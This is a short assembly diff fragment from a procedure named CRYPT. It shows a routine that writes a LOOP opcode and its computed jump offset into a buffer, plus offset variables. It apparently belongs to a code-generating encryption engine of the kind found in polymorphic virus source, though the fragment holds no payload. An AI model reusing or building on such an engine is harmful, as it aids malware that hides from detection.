+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+do_loop:                      ;
+push eax                      ;
+push ebx                      ;
+mov al,0E2H                   ;
+stosb                         ;
+sub ebx,edi                   ;
+dec ebx                       ;
+mov al,bl                     ;
+stosb                         ;
+mov [ebp+_off4],edi           ; MARK the end.
+pop ebx                       ;
+pop eax                       ;
+ret                           ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+_off1 dd 0
+_off2 dd 0
+_off3 dd 0
+_off4 dd 0
+_off5 dd 0                    ; offset 4 'RET' , put a Nop
+siz dd 0
+
+CRYPT endp
